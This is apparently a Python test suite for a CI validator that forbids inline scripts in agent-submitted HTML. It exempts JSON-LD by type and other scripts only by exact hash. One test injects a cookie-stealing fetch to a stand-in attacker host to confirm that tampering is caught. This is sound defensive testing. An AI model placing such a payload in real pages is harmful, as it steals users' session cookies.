#!/usr/bin/env python3
"""Tests for the inline-script rules in validate_agent_pr.py.

Two exemptions live side by side and they are not the same shape. JSON-LD is
exempted by type, which is safe because a browser never executes it. Anything
executable is exempted only by exact content hash, one entry at a time, each
reviewed by a person.

    python -m unittest discover -s scripts/ci -p 'test_*.py'

These exercise check_html directly rather than driving a scratch git repo,
because the behaviour under test is entirely about HTML parsing and policy
flags. Standard library only.
"""

from __future__ import annotations

import importlib.util
import os
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
VALIDATOR = os.path.join(HERE, "validate_agent_pr.py")

_spec = importlib.util.spec_from_file_location("validate_agent_pr", VALIDATOR)
v = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(v)


PAGE = """<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="description" content="A page.">
  <title>Page</title>
%s
</head>
<body><h1>Page</h1></body>
</html>
"""

VALID_JSONLD = """  <script type="application/ld+json">
  {"@context": "https://schema.org", "@type": "Article", "headline": "Beta65 tune"}
  </script>"""

MALFORMED_JSONLD = """  <script type="application/ld+json">
  {"@context": "https://schema.org", "@type": "Article",,, headline: nope}
  </script>"""

PLAIN_INLINE = """  <script>window.track('pageview');</script>"""

# The one inline script the site actually ships, byte for byte. It sets the flag
# the scroll-reveal styles hang off before first paint; as an external file it
# would be a render-blocking request ahead of LCP.
JS_MOTION_SNIPPET = (
    "if('IntersectionObserver' in window)"
    "document.documentElement.classList.add('js-motion');"
)
JS_MOTION_HASH = "sha256-FcuGtowxz5Qysr2TXFpaJMfLuuZ7DyUhSTozGn6zlac="
JS_MOTION = "  <script>%s</script>" % JS_MOTION_SNIPPET

TRACKER_HASH_INPUT = "window.track('pageview');"


def pinned(*hashes: str) -> dict:
    """Policy with the given hashes pinned, mirroring the shipped shape."""
    return policy(allow_inline_script_hashes={h: "test pin" for h in hashes})

EXTERNAL_SCRIPT = (
    '  <script defer src="https://static.cloudflareinsights.com/beacon.min.js"></script>'
)


def policy(**html_overrides) -> dict:
    checks = {"forbid_inline_script": True, "require_meta_description": True}
    checks.update(html_overrides)
    return {"html_checks": checks, "link_checks": {"check_internal": False}}


def run(body_head: str, pol: dict) -> list[str]:
    """Run check_html over a page and return the violation messages."""
    v.VIOLATIONS.clear()
    v.check_html("content/guides/x.html", PAGE % body_head, pol, set(), HERE)
    return list(v.VIOLATIONS)


class TestJsonLdExemption(unittest.TestCase):
    def tearDown(self) -> None:
        v.VIOLATIONS.clear()

    def test_valid_jsonld_passes_when_allowed(self):
        problems = run(VALID_JSONLD, policy(allow_jsonld=True))
        self.assertEqual(problems, [], "valid JSON-LD should be exempt")

    def test_malformed_jsonld_fails_even_when_allowed(self):
        problems = run(MALFORMED_JSONLD, policy(allow_jsonld=True))
        self.assertTrue(problems, "malformed JSON-LD must not slip through")
        self.assertIn("does not contain valid JSON", problems[0])

    def test_plain_inline_script_still_fails_when_jsonld_allowed(self):
        problems = run(PLAIN_INLINE, policy(allow_jsonld=True))
        self.assertTrue(problems)
        self.assertIn("inline <script> is forbidden", problems[0])

    def test_allow_jsonld_false_restores_the_blanket_ban(self):
        problems = run(VALID_JSONLD, policy(allow_jsonld=False))
        self.assertTrue(problems, "with the flag off, JSON-LD is just an inline script")
        self.assertIn("inline <script> is forbidden", problems[0])
        self.assertIn("allow_jsonld", problems[0], "the message should name the escape hatch")

    def test_absent_key_defaults_to_allowed(self):
        # allow_jsonld defaults to true, so a policy that never sets the key
        # still permits structured data. Safe because the exemption is narrow:
        # exact type match plus a successful JSON parse.
        self.assertEqual(run(VALID_JSONLD, policy()), [])

    def test_absent_key_still_rejects_malformed_jsonld(self):
        # The default being permissive must not make it unconditional.
        problems = run(MALFORMED_JSONLD, policy())
        self.assertTrue(problems)
        self.assertIn("does not contain valid JSON", problems[0])

    def test_inline_text_javascript_still_fails(self):
        js = '  <script type="text/javascript">window.track(1);</script>'
        problems = run(js, policy(allow_jsonld=True))
        self.assertTrue(problems, "an explicitly-typed inline script is still a script")
        self.assertIn("inline <script> is forbidden", problems[0])

    def test_inline_module_script_still_fails(self):
        mod = '  <script type="module">export const a = 1;</script>'
        problems = run(mod, policy(allow_jsonld=True))
        self.assertTrue(problems)
        self.assertIn("inline <script> is forbidden", problems[0])

    def test_external_script_is_unaffected(self):
        pol = policy(allow_jsonld=True, allowed_script_hosts=["static.cloudflareinsights.com"])
        self.assertEqual(run(EXTERNAL_SCRIPT, pol), [])

    def test_jsonld_and_plain_inline_together_reports_only_the_plain_one(self):
        problems = run(VALID_JSONLD + "\n" + PLAIN_INLINE, policy(allow_jsonld=True))
        self.assertEqual(len(problems), 1)
        self.assertIn("inline <script> is forbidden", problems[0])

    def test_empty_jsonld_block_is_invalid_json(self):
        empty = '  <script type="application/ld+json"></script>'
        problems = run(empty, policy(allow_jsonld=True))
        self.assertTrue(problems, "an empty structured-data block is a defect")
        self.assertIn("does not contain valid JSON", problems[0])

    def test_type_match_is_exact(self):
        # A near-miss type is not the exemption; it stays a forbidden inline script.
        near = '  <script type="application/json">{"a": 1}</script>'
        problems = run(near, policy(allow_jsonld=True))
        self.assertTrue(problems)
        self.assertIn("inline <script> is forbidden", problems[0])

    def test_type_match_tolerates_case_and_whitespace(self):
        odd = '  <script type=" Application/LD+JSON ">{"a": 1}</script>'
        self.assertEqual(run(odd, policy(allow_jsonld=True)), [])

    def test_two_jsonld_blocks_are_checked_independently(self):
        problems = run(VALID_JSONLD + "\n" + MALFORMED_JSONLD, policy(allow_jsonld=True))
        self.assertEqual(len(problems), 1)
        self.assertIn("does not contain valid JSON", problems[0])

    def test_jsonld_does_not_disturb_the_tag_stack(self):
        problems = run(VALID_JSONLD + "\n  <div>", policy(allow_jsonld=True))
        self.assertTrue(any("unclosed tag <div>" in p for p in problems))
        self.assertFalse(any("script" in p for p in problems))


class TestInlineScriptHashPinning(unittest.TestCase):
    """Exact-content allowlist. The hash is the identity."""

    def tearDown(self) -> None:
        v.VIOLATIONS.clear()

    # -- the pin itself ----------------------------------------------------

    def test_hash_matches_the_value_pinned_in_the_policy(self):
        # Recomputed here rather than read out of the policy, so the two cannot
        # quietly agree with each other on a wrong value.
        self.assertEqual(v.inline_script_hash(JS_MOTION_SNIPPET), JS_MOTION_HASH)

    def test_known_snippet_passes(self):
        self.assertEqual(run(JS_MOTION, pinned(JS_MOTION_HASH)), [])

    # -- drift -------------------------------------------------------------

    def test_one_character_changed_fails(self):
        tampered = JS_MOTION.replace("js-motion", "js-motiom")
        problems = run(tampered, pinned(JS_MOTION_HASH))
        self.assertTrue(any("inline <script> is forbidden" in p for p in problems))
        self.assertFalse(any(JS_MOTION_HASH in p for p in problems))

    def test_appended_statement_fails(self):
        # The shape a real attack would take: leave the approved snippet intact
        # so it still reads right, and ride along behind it.
        tampered = JS_MOTION.replace(
            "</script>", "fetch('https://evil.example/'+document.cookie);</script>"
        )
        problems = run(tampered, pinned(JS_MOTION_HASH))
        self.assertTrue(any("inline <script> is forbidden" in p for p in problems))

    def test_prepended_statement_fails(self):
        tampered = JS_MOTION.replace("<script>", "<script>var x=1;")
        self.assertTrue(run(tampered, pinned(JS_MOTION_HASH)))

    def test_internal_whitespace_change_fails(self):
        # Stripping the ends is a convenience. Collapsing the middle would let
        # two different scripts share one hash.
        tampered = JS_MOTION.replace("' in window)", "'  in  window)")
        self.assertTrue(run(tampered, pinned(JS_MOTION_HASH)))

    # -- unknown scripts ---------------------------------------------------

    def test_unrelated_inline_script_fails_and_reports_its_hash(self):
        problems = run(PLAIN_INLINE, pinned(JS_MOTION_HASH))
        self.assertEqual(len(problems), 1)
        computed = v.inline_script_hash(TRACKER_HASH_INPUT)
        self.assertIn(computed, problems[0],
                      "the error must print the hash or a reviewer cannot pin it")
        self.assertIn("allow_inline_script_hashes", problems[0])

    def test_pinning_one_script_does_not_admit_another_in_the_same_file(self):
        problems = run(JS_MOTION + "\n" + PLAIN_INLINE, pinned(JS_MOTION_HASH))
        self.assertEqual(len(problems), 1)
        self.assertIn(v.inline_script_hash(TRACKER_HASH_INPUT), problems[0])

    # -- normalisation -----------------------------------------------------

    def test_crlf_and_lf_hash_the_same(self):
        # These files are CRLF in the working tree and LF in the object store.
        # A gate that passes on CI and fails on a laptop is worse than none.
        multiline = "var a = 1;\nvar b = 2;"
        self.assertEqual(
            v.inline_script_hash(multiline),
            v.inline_script_hash(multiline.replace("\n", "\r\n")),
        )

    def test_bare_cr_is_normalised_too(self):
        multiline = "var a = 1;\nvar b = 2;"
        self.assertEqual(
            v.inline_script_hash(multiline),
            v.inline_script_hash(multiline.replace("\n", "\r")),
        )

    def test_surrounding_whitespace_is_ignored(self):
        # Reindenting a page must not break the build over an untouched script.
        indented = "  <script>\n    %s\n  </script>" % JS_MOTION_SNIPPET
        self.assertEqual(run(indented, pinned(JS_MOTION_HASH)), [])

    def test_crlf_in_the_page_still_matches_the_pin(self):
        page_crlf = (PAGE % JS_MOTION).replace("\n", "\r\n")
        v.VIOLATIONS.clear()
        v.check_html("content/guides/x.html", page_crlf, pinned(JS_MOTION_HASH), set(), HERE)
        self.assertEqual(list(v.VIOLATIONS), [])

    # -- defaults ----------------------------------------------------------

    def test_absent_key_keeps_the_blanket_ban(self):
        problems = run(JS_MOTION, policy())
        self.assertTrue(any("inline <script> is forbidden" in p for p in problems))

    def test_empty_allowlist_keeps_the_blanket_ban(self):
        self.assertTrue(run(JS_MOTION, policy(allow_inline_script_hashes={})))

    def test_null_allowlist_keeps_the_blanket_ban(self):
        self.assertTrue(run(JS_MOTION, policy(allow_inline_script_hashes=None)))

    def test_forbid_inline_script_false_still_short_circuits(self):
        self.assertEqual(run(PLAIN_INLINE, policy(forbid_inline_script=False)), [])

    # -- interaction with the other rules ----------------------------------

    def test_jsonld_is_unaffected_by_the_hash_allowlist(self):
        self.assertEqual(run(VALID_JSONLD, pinned(JS_MOTION_HASH)), [])

    def test_malformed_jsonld_still_fails_alongside_a_pinned_script(self):
        problems = run(JS_MOTION + "\n" + MALFORMED_JSONLD, pinned(JS_MOTION_HASH))
        self.assertEqual(len(problems), 1)
        self.assertIn("does not contain valid JSON", problems[0])

    def test_jsonld_body_is_not_offered_to_the_hash_allowlist(self):
        # JSON-LD goes down its own path. Pinning its hash must not become a
        # second route past the JSON validity check.
        body = '\n  {"@context": "https://schema.org", "@type": "Article",,, headline: nope}\n  '
        problems = run(MALFORMED_JSONLD, pinned(v.inline_script_hash(body)))
        self.assertTrue(any("does not contain valid JSON" in p for p in problems))

    def test_external_script_is_judged_by_host_not_by_hash(self):
        # A <script src> has no body to hash; the host allowlist is the
        # authority for it and the hash allowlist must not reach it either way.
        problems = run(EXTERNAL_SCRIPT, pinned(JS_MOTION_HASH))
        self.assertTrue(any("external script host" in p for p in problems))
        self.assertFalse(any("inline <script>" in p for p in problems))

    def test_pinned_script_does_not_disturb_the_tag_stack(self):
        problems = run(JS_MOTION + "\n  <div>", pinned(JS_MOTION_HASH))
        self.assertTrue(any("unclosed tag <div>" in p for p in problems))
        self.assertFalse(any("script" in p for p in problems))

    def test_unterminated_inline_script_is_still_reported(self):
        v.VIOLATIONS.clear()
        v.check_html("content/guides/x.html", "<html><head><script>var a = 1;",
                     pinned(JS_MOTION_HASH), set(), HERE)
        self.assertTrue(any("inline <script> is forbidden" in p for p in v.VIOLATIONS))
        v.VIOLATIONS.clear()


class TestShippedPolicy(unittest.TestCase):
    def load_policy(self) -> dict:
        import json

        with open(os.path.join(HERE, "agent_policy.json"), encoding="utf-8") as handle:
            return json.load(handle)

    def test_repo_policy_enables_the_exemption(self):
        checks = self.load_policy()["html_checks"]
        self.assertTrue(checks["forbid_inline_script"])
        self.assertTrue(checks["allow_jsonld"], "the site's SEO setup depends on JSON-LD")

    def test_policy_pins_only_the_js_motion_flag(self):
        hashes = self.load_policy()["html_checks"]["allow_inline_script_hashes"]
        self.assertEqual(list(hashes), [JS_MOTION_HASH],
                         "every entry here is a security decision -- new ones need review")

    def test_every_pin_carries_a_reason(self):
        hashes = self.load_policy()["html_checks"]["allow_inline_script_hashes"]
        for digest, reason in hashes.items():
            self.assertGreater(len(reason), 60,
                               "%s is pinned with no explanation of why" % digest)

    def test_the_shipped_pages_pass_their_own_gate(self):
        # The point of the change: editing any of these four must stop needing
        # human-override for a line nobody touched.
        pol = self.load_policy()
        repo_root = os.path.dirname(os.path.dirname(HERE))
        for name in ("index.html", "bench.html", "gear.html", "tune-database.html"):
            with self.subTest(page=name):
                with open(os.path.join(repo_root, name), encoding="utf-8") as handle:
                    text = handle.read()
                v.VIOLATIONS.clear()
                v.check_html(name, text, pol, set(), repo_root)
                script_problems = [p for p in v.VIOLATIONS if "script" in p]
                self.assertEqual(script_problems, [], "%s: %s" % (name, script_problems))
        v.VIOLATIONS.clear()


if __name__ == "__main__":
    unittest.main(verbosity=2)
